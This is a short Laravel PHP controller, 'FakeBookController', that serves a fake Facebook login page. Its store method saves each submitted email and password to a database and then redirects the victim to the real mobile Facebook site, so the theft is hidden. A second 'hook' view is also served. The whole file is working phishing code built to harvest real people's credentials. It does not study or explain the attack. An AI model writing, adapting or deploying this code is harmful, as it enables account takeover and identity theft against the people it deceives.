<?php

namespace App\Http\Controllers;

use App\Models\Fakebook;
use Illuminate\Http\Request;

class FakeBookController extends Controller
{
    public function login(){
        return view('fakebook.login');
    }

    public function store(Request $request){
        $data = $request->validate([
            'email'=>'required',
            'password'=>'required'
        ]);

        Fakebook::create($data);
        return redirect('///m.facebook.com');
    }

    public function hook(){
        return view('fakebook.hook');
    }
}
